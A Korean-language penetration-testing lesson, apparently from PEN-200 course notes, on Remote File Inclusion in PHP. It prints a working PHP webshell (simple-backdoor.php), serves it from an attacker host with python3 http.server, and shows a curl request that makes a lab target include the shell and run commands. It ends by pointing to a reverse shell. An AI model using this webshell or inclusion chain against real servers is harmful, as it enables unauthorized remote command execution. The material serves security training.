# 9.2.3 RFI (원격 파일 인클루전)

> **Remote File Inclusion (RFI)** · PEN-200 §9.2.3

**RFI 는 LFI 보다 드묾 — 대상 시스템이 특정한 방식으로 구성돼 있어야 성립하기 때문임.** PHP 애플리케이션이라면 앞 절의 `data://` 래퍼와 마찬가지로 `allow_url_include` 가 켜져 있어야 하고, 이 옵션은 현행 PHP 전 버전에서 기본 비활성임. 켜져 있는 전형적인 상황은 애플리케이션이 라이브러리나 애플리케이션 데이터를 원격 시스템에서 불러오도록 만들어진 경우임.

LFI 가 로컬 파일을 포함시키는 것이라면 **RFI 는 HTTP 나 SMB 로 «원격» 시스템의 파일을 포함시킴.** 포함된 파일은 마찬가지로 웹 애플리케이션의 컨텍스트에서 실행됨. 발견 기법은 디렉터리 탐색·LFI 절과 동일함.

Kali 는 `/usr/share/webshells/php/` 에 PHP 웹셸 여러 개를 기본 포함함. 웹셸은 웹 기반 명령행 인터페이스를 제공하는 작은 스크립트로, 명령 실행을 간편하게 만들어 줌. 아래 `simple-backdoor.php` 는 `cmd` 파라미터로 명령을 받아 `system` 함수로 실행하며, 앞 절에서 쓴 PHP 스니펫과 구조가 거의 같음.

```
kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
...
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
...
```

*`simple-backdoor.php` 웹셸의 위치와 내용*

**RFI 의 전제 조건은 «대상이 그 원격 파일에 접근할 수 있어야 한다»는 것임.** Kali 에서 `python3` 의 `http.server` 모듈로 웹 서버를 띄워 포함시킬 파일을 제공함. 이 모듈은 터미널의 현재 디렉터리를 웹 루트로 삼음. GitHub 처럼 공개 접근 가능한 파일을 써도 됨.

```
kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

*`python3 http.server` 모듈 기동*

이후 취약한 파라미터에 원격 URL 을 넣고 `cmd` 로 명령을 지정함.

```
kali@kali:/usr/share/webshells/php/$ curl
"http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-
backdoor.php&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
<pre>admin.php

```

*원격 호스팅한 PHP 백도어를 포함시켜 `ls` 실행*

여기서 Netcat 리스너를 띄우고 리버스 셸 명령을 주면 LFI 절과 동일하게 대화형 셸까지 이어짐.
